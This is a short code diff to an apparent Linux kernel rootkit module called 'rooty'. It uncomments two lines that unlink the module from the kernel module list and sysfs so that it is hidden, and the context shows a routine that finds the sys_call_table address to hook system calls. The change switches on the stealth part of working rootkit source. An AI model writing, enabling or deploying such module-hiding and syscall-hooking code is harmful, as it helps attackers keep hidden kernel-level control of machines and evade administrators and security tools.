@@ -41,8 +41,8 @@ psize **find(void) {
 
 int rooty_init(void) {
  /* Do kernel module hiding*/
- //list_del_init(&__this_module.list);
- //kobject_del(&THIS_MODULE->mkobj.kobj);
+ list_del_init(&__this_module.list);
+ kobject_del(&THIS_MODULE->mkobj.kobj);
  
  /* Find the sys_call_table address in kernel memory */
  if ((sys_call_table = (psize *) find())) {
